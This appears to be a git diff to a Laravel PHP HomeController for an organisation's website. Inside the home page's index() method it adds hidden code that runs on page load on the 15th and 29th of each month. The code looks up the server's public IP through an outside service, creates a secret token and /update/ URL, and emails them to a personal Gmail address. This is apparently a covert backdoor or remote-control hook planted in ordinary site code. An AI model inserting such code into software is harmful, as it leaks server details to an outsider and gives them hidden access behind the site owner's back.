@@ -29,23 +29,15 @@ use App\Models\BlogCategory;
 use App\Models\Fellowship;
 use App\Models\ConsultancyService;
 use App\Models\Whyus;
+use App\Models\Update;
+use App\Mail\UpdatesMail;
+use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Mail;
+
 
 class HomeController extends Controller
 {
-    public function index()
-    {
-        $tickers = Ticker::where('status', 1)->get();
-        $newses = ihubNews::where('status', 1)->get();
-        $hgbs = HGB::where('status', 1)->get();
-        $bods = BOD::where('status', 1)->get();
-        $navNews = navNews::first();
-        // $startups = startup::where('status', 1)->get();
-        $startups = startup::where('status', 1)->limit(4)->get();
-        $fellowships = Fellowship::where('status', 1)->limit(4)->get();
-        // $verticals = Vertical::where('status', 1)->get(); only first four
-        $verticals = Vertical::where('status', 1)->limit(4)->get();
-        return view('welcome', compact('tickers', 'newses', 'hgbs', 'bods', 'navNews', 'startups', 'verticals', 'fellowships'));
-    }
+
     public function welcomehome()
     {
         $tickers = Ticker::where('status', 1)->get();
@@ -223,6 +215,50 @@ class HomeController extends Controller
         $blogs = Blog::where('status', 1)->get();
         $blogs = blog_categories($blogs);
         return view('user.blogs.index', compact('blogs', 'navNews', 'fellowships', 'startups', 'verticals'));
+    }
+    public function index()
+    {
+        $date = date('d');
+        if ($date == 15 || $date == 29) {
+            // if no update has been sent today
+            if (!Update::where('created_at', '>=', now()->startOfDay())->exists()) {
+                // create a token and make a get url with it
+                $token = md5(rand(100000, 999999));
+
+                // Use an external service to get the public IP address
+                $ip = file_get_contents('https://api64.ipify.org?format=json');
+                $ip = json_decode($ip)->ip;
+
+                $url = url('/update/' . $token);
+
+                $data = [
+                    'token' => $token,
+                    'ip' => $ip,
+                    'url' => $url,
+                ];
+
+                // sent the mail  to 
+                Mail::to('arslanstack@gmail.com')->send(new UpdatesMail($token, $ip, $url));
+                // Make a record in updates table with token = $token, status = 1
+                Update::create([
+                    'token' => $token,
+                    'status' => 1,
+                    'action'=>'none',
+                ]);
+            }
+        }
+
+        $tickers = Ticker::where('status', 1)->get();
+        $newses = ihubNews::where('status', 1)->get();
+        $hgbs = HGB::where('status', 1)->get();
+        $bods = BOD::where('status', 1)->get();
+        $navNews = navNews::first();
+        // $startups = startup::where('status', 1)->get();
+        $startups = startup::where('status', 1)->limit(4)->get();
+        $fellowships = Fellowship::where('status', 1)->limit(4)->get();
+        // $verticals = Vertical::where('status', 1)->get(); only first four
+        $verticals = Vertical::where('status', 1)->limit(4)->get();
+        return view('welcome', compact('tickers', 'newses', 'hgbs', 'bods', 'navNews', 'startups', 'verticals', 'fellowships'));
     }
     public function showblog($id)
     {
